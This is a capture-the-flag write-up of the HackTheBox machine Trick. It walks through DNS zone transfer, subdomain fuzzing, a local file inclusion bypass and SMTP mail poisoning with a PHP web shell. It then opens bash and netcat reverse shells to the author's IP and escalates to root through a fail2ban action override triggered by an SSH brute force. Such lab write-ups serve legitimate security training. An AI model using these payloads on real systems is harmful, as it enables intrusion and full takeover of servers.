
# HTB-Trick

<img width="862" height="793" alt="Screenshot 2025-09-20 214022" src="https://github.com/AmIACatPurr/HTB-CTF/blob/main/writeups/assets/trick.jpg" />


---
## Intro

Welcome to Trick. This machine isn’t a sci-fi anomaly; it’s a monument to corporate complacency and the illusion of perimeter defense. 
It perfectly illustrates the fundamental law of the digital underground: you don’t always need a flashy zero-day exploit to burn a system down; 
you just need to read the manual better than the person who built it..

2 sessions for this try, so 2 IPs
Target IP 10.129.26.93 / 10.129.227.180
My IP 10.10.14.138

## nmap
We started by mapping the target's digital footprint.

```bash
┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #nmap -p- --min-rate 10000 10.129.26.93
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 21:48 EDT
Nmap scan report for 10.129.26.93
Host is up (0.0090s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #nmap -p 22,25,53,80 -sCV 10.129.26.93
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 21:49 EDT
Nmap scan report for 10.129.26.93
Host is up (0.0076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 241.39 seconds
```
## SMTP
can't reach it
```bash

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: Couldn't establish connection on port 25


┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #telnet 10.129.26.93 25
Trying 10.129.26.93...
Connected to 10.129.26.93.
Escape character is '^]'.
hi
cat
220 debian.localdomain ESMTP Postfix (Debian/GNU)
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
VRFY CAT
550 5.1.1 <CAT>: Recipient address rejected: User unknown in local recipient table
VRFY ROOT
252 2.0.0 ROOT
```
USER root PRESENT

## DIG
```bash
┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #dig -x 10.129.26.93 @10.129.26.93

; <<>> DiG 9.20.18-1~deb13u1-Debian <<>> -x 10.129.26.93 @10.129.26.93
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2573
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 32e307ce8c7530d45c4435a76a3748aad13cf7c8fedefd51 (good)
;; QUESTION SECTION:
;93.26.129.10.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
93.26.129.10.in-addr.arpa. 604800 IN	PTR	trick.htb.

;; AUTHORITY SECTION:
26.129.10.in-addr.arpa.	604800	IN	NS	trick.htb.

;; ADDITIONAL SECTION:
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1

;; Query time: 9 msec
;; SERVER: 10.129.26.93#53(10.129.26.93) (UDP)
;; WHEN: Sat Jun 20 22:12:58 EDT 2026
;; MSG SIZE  rcvd: 163


┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #dig axfr @10.129.26.93 trick.htb

; <<>> DiG 9.20.18-1~deb13u1-Debian <<>> axfr @10.129.26.93 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 9 msec
;; SERVER: 10.129.26.93#53(10.129.26.93) (TCP)
;; WHEN: Sat Jun 20 22:13:58 EDT 2026
;; XFR size: 6 records (messages 1, bytes 231)

```

update file hosts with findings
```bash
echo '10.129.26.93 trick.htb preprod-payroll.trick.htb' | sudo tee -a /etc/hosts
```

subdomain enum 
```bash
┌─[✗]─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.129.26.93 -H "Host: FUZZ.trick.htb" -fs 5480

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.26.93
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5480
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 5000 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```
Based on url structure i want to try a thing
```bash
─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-j4o38yc17j]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://trick.htb -H "Host:preprod-FUZZ.trick.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trick.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: preprod-FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 8ms]
payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 39ms]


```
ok hot one thing interesting, i'll add to the hosts file

```bash
echo '10.129.26.93 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
```
checking this new website, an URL is interesting
http://preprod-marketing.trick.htb/index.php?page=services.html
 it might be vulnerable to Local File Inclusion, let's try to double the chrs

...and it works...
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd

Note: from here another session
Target IP 10.129.227.180
kinda feel blocked atm

Based on what i saw you can send an email to the  user found, michael
Since PHP wrap’s everything in index.php, if we can view michaels email through our LFI, and if we can send michael an email 
with a bind shell in it, we may be able to get code execution on the server.
```bash
─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-j4o38yc17j]─[~]
└──╼ [★]$ swaks --to michael --from ATalkingCat --header 'Subject: Testing!' --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.129.227.180
=== Trying 10.129.227.180:25...
=== Connected to 10.129.227.180.
<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
 -> EHLO htb-j4o38yc17j
<-  250-debian.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<ATalkingCat>
<-  250 2.1.0 Ok
 -> RCPT TO:<michael>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Mon, 22 Jun 2026 08:36:10 -0400
 -> To: michael
 -> From: ATalkingCat
 -> Subject: Testing!
 -> Message-Id: <20260622083610.211384@htb-j4o38yc17j>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> <?php system($_REQUEST["cmd"]); ?>
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 42BFB4099D
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```
checking via browser
let's see if the mail is present 
```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael
```
maybe it works...and yes
```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=id'
```

so i could open a listener on my machine and run reverse shell
```bash
on my machine nc -lvnp 4444

http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.138/4321 0>%261'
```

i got a shell with the user michael so i go direct to the flag... michael@trick:~$ cat user.txt
for pesistance we can go to michael@trick:~/.ssh$
to loot the files to use, now for the escalation part

```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart

michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d

michael@trick:~$ ls /etc/fail2ban/action.d/

```
michael can restart fail2ban as root.
after some tests, to abuse the system, it involves creating a .local file that will override the .conf file in the iptables configuration.

```bash
going in the directory makes it feel easy /etc/fail2ban/action.d/

cp ./iptables-multiport.conf ./iptables-multiport.local
No nano, and only VIM avaiable but no thanks
echo "actionban = /usr/bin/nc 10.10.14.138 1234 -e /bin/bash" >> iptables-multiport.local

while on my machine i set up a listener nc -lnvp 1234

sudo /etc/init.d/fail2ban restart
and nothing, we need t otrigger the ban

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.129.227.180 ssh

and yes, i am root
```
